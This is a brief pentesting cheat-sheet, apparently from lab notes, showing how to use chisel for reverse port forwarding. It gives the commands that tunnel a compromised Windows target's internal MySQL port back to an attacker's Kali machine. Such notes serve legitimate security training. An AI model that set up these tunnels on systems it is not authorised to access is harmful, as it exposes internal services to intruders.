# Chisel

## reverse port forwarding

Set up chisel on kali:

```
chisel server --socks5 --reverse
```

Set up chisel on target:

{% code overflow="wrap" %}
```
chisel.exe client --fingerprint HEoB1nCbMpJ7xkjsc3K1+OXhzX/LosSQH1N/D0xBXcU= 10.10.14.37:8080 R:1235:127.0.0.1:3306
```
{% endcode %}

* 10.10.14.37:8080 - kali ip and listening port
* R - Reverse mode
* R:1235:127.0.0.1:3306 - forwarding local port `3306` to port `1235` on Kali
  * Any connection made to `127.0.0.1:1235` on Kali gets tunneled to `127.0.0.1:3306` on the Windows machine.









{% embed url="https://medium.com/@gsanjay1708/pivoting-with-chisel-b5bbd8e1e92b" %}
